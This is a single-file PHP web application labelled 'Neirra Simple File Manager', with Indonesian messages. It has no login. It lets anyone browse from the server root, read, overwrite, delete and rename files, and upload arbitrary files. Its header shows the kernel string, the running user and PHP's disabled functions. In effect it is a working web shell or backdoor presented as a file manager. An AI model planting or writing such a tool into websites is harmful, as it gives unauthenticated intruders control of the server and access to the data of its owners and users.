<?php
/**
 * Neirra Simple File Manager
 * - PHP 8.1.33 compatible (tested)
 * - SweetAlert2 + CodeMirror (ayu-mirage) + Font Awesome 4.7
 * - Header env (uname -a, PHP version, current user, disable_functions)
 * - Breadcrumb PWD (full, clickable) — supports navigating to /, /home, /tmp (via whitelist)
 * - Folder-first listing with icons
 * - Click filename -> SweetAlert2 popup editor (CodeMirror), Save/Cancel
 * - Actions: Delete, Rename
 * - Upload multiple, Create file/folder
 *
 * Notes:
 * - Default base is this script directory. Set $ALLOW_ABSOLUTE=true to allow absolute navigation
 *   within $ALLOWED_PREFIXES (still subject to open_basedir and filesystem permissions).
 */

declare(strict_types=1);

// -------------------------------
// Config
// -------------------------------
$BASE_PATH       = realpath(__DIR__) ?: __DIR__;
$MAX_EDIT_BYTES  = 2 * 1024 * 1024; // 2 MB maximum content for popup editor
$ALLOW_ABSOLUTE  = true;            // allow navigation to absolute paths in whitelist
$ALLOWED_PREFIXES = [
    '/',        // allow root (subject to open_basedir/permissions). Remove for stricter setup.
    '/home',
    '/tmp',
    $BASE_PATH, // always allow this script's directory
];

// -------------------------------
// Helpers
// -------------------------------
function is_disabled(string $fn): bool {
    $df = ini_get('disable_functions') ?: '';
    $disabled = array_filter(array_map('trim', explode(',', $df)));
    return in_array($fn, $disabled, true) || !function_exists($fn);
}

function path_is_allowed(string $path): bool {
    global $ALLOWED_PREFIXES;
    $real = realpath($path);
    if ($real === false) $real = rtrim($path, DIRECTORY_SEPARATOR);
    $real = rtrim($real, DIRECTORY_SEPARATOR) ?: DIRECTORY_SEPARATOR;
    foreach ((array)$ALLOWED_PREFIXES as $pref) {
        $p = realpath($pref);
        if ($p === false) $p = rtrim($pref, DIRECTORY_SEPARATOR);
        $p = rtrim($p, DIRECTORY_SEPARATOR) ?: DIRECTORY_SEPARATOR;
        if ($pref === '/' || str_starts_with($real, $p)) return true;
    }
    return false;
}

/**
 * Join/sanitize path against base; when absolute and ALLOW_ABSOLUTE=true, validate against whitelist.
 */
function safe_join(string $base, string $path): string {
    $path = str_replace(["\0"], '', $path);
    $baseReal = realpath($base) ?: $base;

    // Absolute input path
    global $ALLOW_ABSOLUTE;
    if (!empty($ALLOW_ABSOLUTE) && $path !== '' && $path[0] === DIRECTORY_SEPARATOR) {
        $real = realpath($path);
        if ($real === false) $real = rtrim($path, DIRECTORY_SEPARATOR);
        return path_is_allowed($real) ? $real : $baseReal;
    }

    // Relative to base
    if ($path === '' || $path === DIRECTORY_SEPARATOR) return $baseReal;
    $joined = $baseReal . DIRECTORY_SEPARATOR . ltrim($path, DIRECTORY_SEPARATOR);
    $real = realpath($joined);
    if ($real === false) $real = $joined;
    // restrict to base if not absolute mode
    if (!path_is_allowed($real)) return $baseReal;
    if (strpos($real, $baseReal) !== 0 && empty($ALLOW_ABSOLUTE)) return $baseReal;
    return $real;
}

function current_path(string $base): string {
    $p = isset($_GET['p']) ? (string)$_GET['p'] : $base;
    return safe_join($base, $p);
}

function fmt_bytes(int $bytes): string {
    if ($bytes < 1024) return $bytes . ' B';
    $units = ['KB','MB','GB','TB'];
    $i = 0; $val = $bytes / 1024;
    while ($val >= 1024 && $i < count($units)-1) { $val /= 1024; $i++; }
    return sprintf('%.2f %s', $val, $units[$i]);
}

function permstr(string $path): string {
    $p = @fileperms($path);
    if ($p === false) return '---------';
    $t = ($p & 0x4000) ? 'd' : '-';
    $map = [0x0100,0x0080,0x0040, 0x0020,0x0010,0x0008, 0x0004,0x0002,0x0001];
    $s = $t; $chars = ['r','w','x'];
    for ($i=0; $i<9; $i++) { $s .= ($p & $map[$i]) ? $chars[$i%3] : '-'; }
    return $s;
}

function file_icon(string $name, bool $isDir): string {
    if ($isDir) return 'fa-folder';
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    return match ($ext) {
        'php','phpt','phtml','html','htm','css','js','mjs','cjs' => 'fa-file-code-o',
        'json','yml','yaml','xml','ini','conf','log','txt','md'   => 'fa-file-text-o',
        'jpg','jpeg','png','gif','webp','bmp','svg','ico','avif'  => 'fa-file-image-o',
        'zip','rar','7z','gz','bz2','xz','tar'                    => 'fa-file-archive-o',
        'pdf' => 'fa-file-pdf-o',
        'doc','docx' => 'fa-file-word-o',
        'xls','xlsx','csv' => 'fa-file-excel-o',
        'sql','db','sqlite' => 'fa-database',
        default => 'fa-file-o',
    };
}

function ext_to_codemirror_mode(string $name): string {
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    return match ($ext) {
        'php','phtml','phpt' => 'application/x-httpd-php',
        'html','htm'         => 'text/html',
        'css'                => 'text/css',
        'js','mjs','cjs'     => 'text/javascript',
        'xml'                => 'application/xml',
        'c','cpp','h','hpp','java' => 'text/x-csrc',
        default              => 'application/x-httpd-php',
    };
}

function json_response(array $data): void {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data);
    exit;
}

// -------------------------------
// AJAX endpoints
// -------------------------------
$cwd = current_path($BASE_PATH);

// Save file
if (isset($_POST['action']) && $_POST['action'] === 'save') {
    $path = safe_join($BASE_PATH, (string)($_POST['path'] ?? ''));
    $content = (string)($_POST['content'] ?? '');
    if (!is_file($path)) json_response(['ok'=>false, 'msg'=>'Target bukan file.']);
    $ok = @file_put_contents($path, $content);
    json_response(['ok' => $ok !== false, 'msg' => $ok !== false ? 'Tersimpan.' : 'Gagal menyimpan.']);
}

// Read file
if (isset($_GET['action']) && $_GET['action'] === 'read') {
    $path = safe_join($BASE_PATH, (string)($_GET['path'] ?? ''));
    if (!is_file($path)) json_response(['ok'=>false, 'msg'=>'File tidak ditemukan.']);
    $size = @filesize($path) ?: 0;
    if ($size > $MAX_EDIT_BYTES) {
        json_response(['ok'=>false, 'msg'=>'File terlalu besar untuk editor (> '.fmt_bytes($MAX_EDIT_BYTES).').']);
    }
    $data = @file_get_contents($path);
    json_response(['ok'=>true, 'name'=>basename($path), 'mode'=>ext_to_codemirror_mode($path), 'content'=>$data]);
}

// Delete
if (isset($_POST['action']) && $_POST['action'] === 'delete') {
    $path = safe_join($BASE_PATH, (string)($_POST['path'] ?? ''));
    $ok = false;
    if (is_dir($path)) { $ok = @rmdir($path); }
    elseif (is_file($path)) { $ok = @unlink($path); }
    json_response(['ok'=>$ok, 'msg'=>$ok?'Terhapus.':'Gagal menghapus (pastikan folder kosong & permission cukup).']);
}

// Rename
if (isset($_POST['action']) && $_POST['action'] === 'rename') {
    $path = safe_join($BASE_PATH, (string)($_POST['path'] ?? ''));
    $newName = trim((string)($_POST['newname'] ?? ''));
    if ($newName === '') json_response(['ok'=>false, 'msg'=>'Nama baru kosong.']);
    $target = dirname($path) . DIRECTORY_SEPARATOR . $newName;
    $ok = @rename($path, $target);
    json_response(['ok'=>$ok, 'msg'=>$ok?'Berhasil rename.':'Gagal rename.', 'newpath'=>$target]);
}

// Create (file/folder)
if (isset($_POST['action']) && $_POST['action'] === 'create') {
    $type = (string)($_POST['type'] ?? '');
    $name = trim((string)($_POST['name'] ?? ''));
    $dir = safe_join($BASE_PATH, (string)($_POST['dir'] ?? $cwd));
    if ($name === '') json_response(['ok'=>false, 'msg'=>'Nama tidak boleh kosong.']);
    $target = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
    $ok = false;
    if ($type === 'file') {
        if (!file_exists($target)) $ok = @touch($target);
    } elseif ($type === 'folder') {
        if (!file_exists($target)) $ok = @mkdir($target, 0755, false);
    }
    json_response(['ok'=>$ok, 'msg'=>$ok?'Berhasil dibuat.':'Gagal membuat (mungkin sudah ada).']);
}

// Upload
if (isset($_POST['action']) && $_POST['action'] === 'upload') {
    $dir = safe_join($BASE_PATH, (string)($_POST['dir'] ?? $cwd));
    $countOK = 0; $countFail = 0;
    if (!empty($_FILES['files']) && is_array($_FILES['files']['name'])) {
        foreach ($_FILES['files']['name'] as $i => $name) {
            if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) {
                $tmp = $_FILES['files']['tmp_name'][$i];
                $dest = $dir . DIRECTORY_SEPARATOR . $name;
                if (@move_uploaded_file($tmp, $dest)) $countOK++; else $countFail++;
            } else {
                $countFail++;
            }
        }
    }
    json_response(['ok'=> $countFail===0, 'msg'=>"Upload selesai: $countOK ok, $countFail gagal."]);
}

// -------------------------------
// UI data
// -------------------------------
$uname = '';
if (!is_disabled('shell_exec')) { $uname = @shell_exec('uname -a') ?: ''; }
if ($uname === '') { $uname = php_uname('a'); }
$phpver = PHP_VERSION;
$user = function_exists('posix_geteuid') && function_exists('posix_getpwuid')
    ? (posix_getpwuid(posix_geteuid())['name'] ?? get_current_user())
    : get_current_user();
$disable_functions = ini_get('disable_functions') ?: '—';

// Normalize current working dir
$cwd = safe_join($BASE_PATH, isset($_GET['p']) ? (string)$_GET['p'] : $BASE_PATH);

// Build listing
$entries = [];
if (is_dir($cwd) && ($dh = @opendir($cwd))) {
    while (($e = readdir($dh)) !== false) {
        if ($e === '.' || $e === '..') continue;
        $full = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $e;
        $isDir = @is_dir($full);
        $entries[] = [
            'name' => $e,
            'full' => $full,
            'isDir' => $isDir,
            'size' => $isDir ? 0 : (@filesize($full) ?: 0),
            'mtime' => @filemtime($full) ?: 0,
            'perm' => permstr($full),
        ];
    }
    closedir($dh);
}
usort($entries, function($a, $b) {
    if ($a['isDir'] !== $b['isDir']) return $a['isDir'] ? -1 : 1;
    return strnatcasecmp($a['name'], $b['name']);
});

// Breadcrumb (full absolute). Segments clickable jika allowed.
function breadcrumb_html(string $base, string $path): string {
    $real = realpath($path) ?: ($path ?: DIRECTORY_SEPARATOR);
    $real = rtrim($real, DIRECTORY_SEPARATOR) ?: DIRECTORY_SEPARATOR;
    $segs = $real === DIRECTORY_SEPARATOR ? [] : explode(DIRECTORY_SEPARATOR, ltrim($real, DIRECTORY_SEPARATOR));

    $accum = DIRECTORY_SEPARATOR;
    $out = [];
    // Root crumb
    $rootAllowed = path_is_allowed(DIRECTORY_SEPARATOR);
    $rootHref = $rootAllowed ? ('?p=' . rawurlencode(DIRECTORY_SEPARATOR)) : '';
    $out[] = $rootHref
      ? '<a class="crumb" href="'.$rootHref.'">/</a>'
      : '<span class="crumb muted">/</span>';

    foreach ($segs as $idx => $seg) {
        $accum = rtrim($accum, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $seg;
        $allowed = path_is_allowed($accum);
        $out[] = '<span class="sep">/</span>';
        if ($allowed) {
            $out[] = '<a class="crumb" href="?p='.rawurlencode($accum).'">'.htmlspecialchars($seg).'</a>';
        } else {
            $out[] = '<span class="crumb muted">'.htmlspecialchars($seg).'</span>';
        }
    }
    return implode('', $out);
}

?><!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Neirra Simple File Manager</title>

<!-- Libraries (as requested) -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/php/php.min.js"></script>
<!-- Tambahan mode HTMLmixed -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/htmlmixed/htmlmixed.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/css/css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/clike/clike.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>

<style>
:root {
    --bg: #111417;
    --fg: #e6e6e6;
    --muted: #a0a0a0;
    --acc: #4fd1c5;
    --danger: #f56565;
    --warning: #f6ad55;
    --ok: #68d391;
    --card: #161a1e;
    --border: #2a2f35;
}
* { box-sizing: border-box; }
body {
    margin: 0; padding: 16px;
    background: var(--bg);
    color: var(--fg);
    font: 14px/1.5 system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, "Helvetica Neue", Arial, "Noto Sans", "Apple Color Emoji","Segoe UI Emoji";
}
.header {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 14px;
    padding: 14px 16px;
    margin-bottom: 12px;
}
.header .row { display: flex; flex-wrap: wrap; gap: 10px 24px; align-items: center; }
.header .badge { display:inline-flex; align-items:center; gap:8px; padding:6px 10px; border-radius:999px; border:1px solid var(--border); background:#12161a; }
.header .badge i { opacity: .9; }
.header .muted { color: var(--muted); }
.pwd {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 10px 12px; margin-bottom: 10px;
    display:flex; justify-content:space-between; align-items:center;
}
.pwd .crumb { color: var(--acc); text-decoration: none; }
.pwd .crumb:hover { text-decoration: underline; }
.pwd .crumb.muted { color: #6b7280; cursor: default; text-decoration: none; }
.pwd .sep { color: var(--muted); margin: 0 4px; }
.toolbar { display:flex; gap:8px; }
.btn {
    display:inline-flex; align-items:center; gap:8px;
    background:#1b2127; border:1px solid var(--border); color:var(--fg);
    padding:8px 12px; border-radius:10px; cursor:pointer; text-decoration:none;
}
.btn:hover { background:#222830; }
.btn.danger { border-color:#3a1f24; color:#ffd4d4; background:#2a0f12; }
.btn.ok { border-color:#224437; background:#0f2820; }
table {
    width: 100%; border-collapse: collapse; overflow:hidden;
    border:1px solid var(--border); border-radius: 12px; background: var(--card);
}
th, td { padding: 10px 12px; border-bottom: 1px solid var(--border); }
th { text-align:left; font-weight:600; color:#b9c0c8; background:#14181d; position:sticky; top:0; }
tr:hover td { background:#171c22; }
.name a { color: var(--fg); text-decoration:none; }
.name a:hover { color: var(--acc); }
.actions a { margin-right: 8px; cursor:pointer; text-decoration:none; }
.size, .mtime, .perm { color: var(--muted); white-space:nowrap; }
footer { margin-top:12px; color:var(--muted); font-size:12px; }
.cm-editor { height: 70vh; }
.swal2-popup { width: min(960px, 95vw) !important; }
</style>
</head>
<body>

<div class="header">
  <div class="row">
    <div class="badge" title="Kernel/Distro">
      <i class="fa fa-linux"></i> <span><?php echo htmlspecialchars($uname); ?></span>
    </div>
    <div class="badge" title="PHP Version">
      <i class="fa fa-code"></i> <span>PHP <?php echo htmlspecialchars($phpver); ?></span>
    </div>
    <div class="badge" title="Current User">
      <i class="fa fa-user"></i> <span><?php echo htmlspecialchars((string)$user); ?></span>
    </div>
    <div class="badge" title="disable_functions">
      <i class="fa fa-ban"></i> <span>disable_functions: <span class="muted"><?php echo htmlspecialchars($disable_functions) ?: '—'; ?></span></span>
    </div>
  </div>
</div>

<div class="pwd">
  <div>
    <strong>PWD:</strong>
    <?php echo breadcrumb_html($BASE_PATH, $cwd); ?>
  </div>
  <div class="toolbar">
    <label class="btn">
      <i class="fa fa-upload"></i> Upload
      <input id="uploader" type="file" name="files[]" multiple style="display:none">
    </label>
    <a class="btn" href="#" id="btnCreate"><i class="fa fa-plus"></i> Create</a>
  </div>
</div>

<table>
  <thead>
    <tr>
      <th style="width:42%;">Name</th>
      <th style="width:12%;">Size</th>
      <th style="width:20%;">Modified</th>
      <th style="width:12%;">Perm</th>
      <th style="width:14%;">Actions</th>
    </tr>
  </thead>
  <tbody>
    <?php
      $showUp = $ALLOW_ABSOLUTE ? ($cwd !== DIRECTORY_SEPARATOR) : (realpath($cwd) !== realpath($BASE_PATH));
      if ($showUp):
        $parent = rtrim(dirname($cwd), DIRECTORY_SEPARATOR);
        if ($parent === '') $parent = DIRECTORY_SEPARATOR;
    ?>
    <tr>
      <td class="name">
        <i class="fa fa-level-up"></i>
        <a href="?p=<?php echo rawurlencode($parent); ?>">.. (up)</a>
      </td>
      <td class="size">—</td>
      <td class="mtime">—</td>
      <td class="perm">—</td>
      <td class="actions">—</td>
    </tr>
    <?php endif; ?>

    <?php foreach ($entries as $e): ?>
      <?php
        $isDir = $e['isDir'];
        $icon  = file_icon($e['name'], $isDir);
        $href  = $isDir ? '?p='.rawurlencode($e['full']) : '#';
        $mtime = $e['mtime'] ? date('Y-m-d H:i:s', $e['mtime']) : '—';
      ?>
      <tr data-full="<?php echo htmlspecialchars($e['full']); ?>" data-isdir="<?php echo $isDir ? '1':'0'; ?>">
        <td class="name">
          <i class="fa <?php echo $icon; ?>"></i>
          <?php if ($isDir): ?>
            <a href="<?php echo $href; ?>"><?php echo htmlspecialchars($e['name']); ?></a>
          <?php else: ?>
            <a href="#" class="open-file" data-file="<?php echo htmlspecialchars($e['full']); ?>" data-name="<?php echo htmlspecialchars($e['name']); ?>">
              <?php echo htmlspecialchars($e['name']); ?>
            </a>
          <?php endif; ?>
        </td>
        <td class="size"><?php echo $isDir ? '—' : fmt_bytes((int)$e['size']); ?></td>
        <td class="mtime"><?php echo $mtime; ?></td>
        <td class="perm"><?php echo htmlspecialchars($e['perm']); ?></td>
        <td class="actions">
          <a class="rename" title="Rename"><i class="fa fa-pencil"></i></a>
          <a class="delete danger" title="Delete"><i class="fa fa-trash"></i></a>
        </td>
      </tr>
    <?php endforeach; ?>
  </tbody>
</table>

<footer>
  Base: <?php echo htmlspecialchars($BASE_PATH); ?> —
  <span class="muted">Neirra Simple File Manager</span>
</footer>

<script>
const cwd = <?php echo json_encode($cwd); ?>;

function toast(icon, title, timer=1600) {
  Swal.fire({toast:true, position:'top-end', showConfirmButton:false, timer, icon, title});
}

async function readFile(path) {
  const qs = new URLSearchParams({action:'read', path});
  const res = await fetch(location.pathname + '?' + qs.toString(), {credentials:'same-origin'});
  return res.json();
}

async function saveFile(path, content) {
  const fd = new FormData();
  fd.append('action','save');
  fd.append('path', path);
  fd.append('content', content);
  const res = await fetch(location.pathname, {method:'POST', body: fd, credentials:'same-origin'});
  return res.json();
}

async function deletePath(path) {
  const fd = new FormData();
  fd.append('action','delete');
  fd.append('path', path);
  const res = await fetch(location.pathname, {method:'POST', body: fd, credentials:'same-origin'});
  return res.json();
}

async function renamePath(path, newname) {
  const fd = new FormData();
  fd.append('action','rename');
  fd.append('path', path);
  fd.append('newname', newname);
  const res = await fetch(location.pathname, {method:'POST', body: fd, credentials:'same-origin'});
  return res.json();
}

async function createThing(type, name, dir) {
  const fd = new FormData();
  fd.append('action','create');
  fd.append('type', type);
  fd.append('name', name);
  fd.append('dir', dir);
  const res = await fetch(location.pathname, {method:'POST', body: fd, credentials:'same-origin'});
  return res.json();
}

async function uploadFiles(files, dir) {
  const fd = new FormData();
  fd.append('action','upload');
  fd.append('dir', dir);
  for (const f of files) fd.append('files[]', f, f.name);
  const res = await fetch(location.pathname, {method:'POST', body: fd, credentials:'same-origin'});
  return res.json();
}

// Open editor when clicking a file name
document.querySelectorAll('.open-file').forEach(a => {
  a.addEventListener('click', async (e) => {
    e.preventDefault();
    const path = a.dataset.file;
    const r = await readFile(path);
    if (!r.ok) return Swal.fire('Gagal', r.msg || 'Tidak bisa membuka file.', 'error');
    let editor;
    await Swal.fire({
      title: r.name,
      html: '<textarea id="editorArea"></textarea>',
      width: '90%',
      showCancelButton: true,
      confirmButtonText: 'Save',
      cancelButtonText: 'Cancel',
      didOpen: () => {
        const ta = document.getElementById('editorArea');
        ta.value = r.content;
        editor = CodeMirror.fromTextArea(ta, {
          lineNumbers: true,
          theme: 'ayu-mirage',
          mode: r.mode || 'application/x-httpd-php',
          matchBrackets: true,
          autoCloseBrackets: true,
          indentUnit: 2,
          tabSize: 2
        });
        editor.setSize('100%', '60vh');
        setTimeout(() => editor.refresh(), 50);
      },
      preConfirm: async () => {
        const content = editor.getValue();
        const save = await saveFile(path, content);
        if (!save.ok) {
          Swal.showValidationMessage(save.msg || 'Gagal menyimpan');
          return false;
        }
        return true;
      }
    });
    if (Swal.isConfirmed) {
      toast('success', 'File tersimpan.');
      setTimeout(() => location.reload(), 400);
    }
  });
});

// Rename
document.querySelectorAll('.rename').forEach(btn => {
  btn.addEventListener('click', async (e) => {
    const tr = e.target.closest('tr');
    const full = tr.dataset.full;
    const oldname = tr.querySelector('.name').innerText.trim();
    const {value: newname} = await Swal.fire({
      title: 'Rename',
      input: 'text',
      inputValue: oldname,
      inputLabel: 'Nama baru',
      showCancelButton: true,
      confirmButtonText: 'Rename'
    });
    if (!newname) return;
    const r = await renamePath(full, newname);
    if (!r.ok) return Swal.fire('Gagal', r.msg || 'Rename gagal', 'error');
    toast('success', 'Rename berhasil');
    setTimeout(() => location.reload(), 500);
  });
});

// Delete
document.querySelectorAll('.delete').forEach(btn => {
  btn.addEventListener('click', async (e) => {
    const tr = e.target.closest('tr');
    const full = tr.dataset.full;
    const isdir = tr.dataset.isdir === '1';
    const confirm = await Swal.fire({
      title: 'Hapus ' + (isdir ? 'Folder' : 'File') + '?',
      text: isdir ? 'Folder harus kosong.' : 'Tindakan tidak dapat dibatalkan.',
      icon: 'warning', showCancelButton: true, confirmButtonText: 'Hapus', confirmButtonColor:'#d33'
    });
    if (!confirm.isConfirmed) return;
    const r = await deletePath(full);
    if (!r.ok) return Swal.fire('Gagal', r.msg || 'Hapus gagal', 'error');
    toast('success', 'Terhapus');
    setTimeout(() => location.reload(), 500);
  });
});

// Create
document.getElementById('btnCreate').addEventListener('click', async () => {
  const {value: formValues} = await Swal.fire({
    title: 'Create',
    html: `
      <div style="display:flex; flex-direction:column; gap:10px; text-align:left">
        <label><input type="radio" name="ctype" value="file" checked> File</label>
        <label><input type="radio" name="ctype" value="folder"> Folder</label>
        <input id="cname" class="swal2-input" placeholder="Nama file atau folder">
      </div>
    `,
    focusConfirm: false,
    showCancelButton: true,
    preConfirm: () => {
      const type = (document.querySelector('input[name="ctype"]:checked') || {}).value;
      const name = document.getElementById('cname').value.trim();
      if (!name) {
        Swal.showValidationMessage('Nama tidak boleh kosong');
        return false;
      }
      return {type, name};
    }
  });
  if (!formValues) return;
  const r = await createThing(formValues.type, formValues.name, cwd);
  if (!r.ok) return Swal.fire('Gagal', r.msg || 'Create gagal', 'error');
  toast('success', 'Berhasil dibuat');
  setTimeout(() => location.reload(), 500);
});

// Upload
document.getElementById('uploader').addEventListener('change', async (e) => {
  const files = e.target.files;
  if (!files || files.length === 0) return;
  const res = await uploadFiles(files, cwd);
  if (!res.ok) {
    Swal.fire('Upload Gagal', res.msg || 'Terjadi kesalahan.', 'error');
  } else {
    toast('success', res.msg || 'Upload selesai');
    setTimeout(() => location.reload(), 500);
  }
});
</script>

</body>
</html>
